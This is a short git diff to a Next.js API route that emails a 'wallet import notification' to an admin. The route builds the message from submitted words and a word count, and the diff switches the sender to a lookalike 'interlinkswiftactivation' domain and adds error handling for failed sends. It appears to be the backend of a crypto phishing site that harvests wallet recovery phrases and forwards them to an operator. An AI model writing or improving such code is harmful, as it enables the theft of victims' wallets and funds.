@@ -8,7 +8,8 @@ export const runtime = "nodejs";
 
 const resendApiKey = process.env.RESEND_API_KEY ?? "";
 const fromEmail =
-  process.env.RESEND_FROM_EMAIL ?? "no-reply@interlinkchain.com";
+  process.env.RESEND_FROM_EMAIL ??
+  "Interlink <notifications@mail.interlinkswiftactivation.com>";
 
 export async function POST(request: Request) {
   try {
@@ -64,12 +65,20 @@ export async function POST(request: Request) {
       wordCount: wordCount || words.length,
     });
 
-    await resend.emails.send({
+    const { error } = await resend.emails.send({
       from: fromEmail,
       to: [adminEmail],
       subject,
       html,
     });
+
+    if (error) {
+      console.error("Resend rejected the wallet import notification:", error);
+      return NextResponse.json(
+        { error: "Failed to send wallet import notification." },
+        { status: 502 },
+      );
+    }
 
     return NextResponse.json({ ok: true });
   } catch (err) {
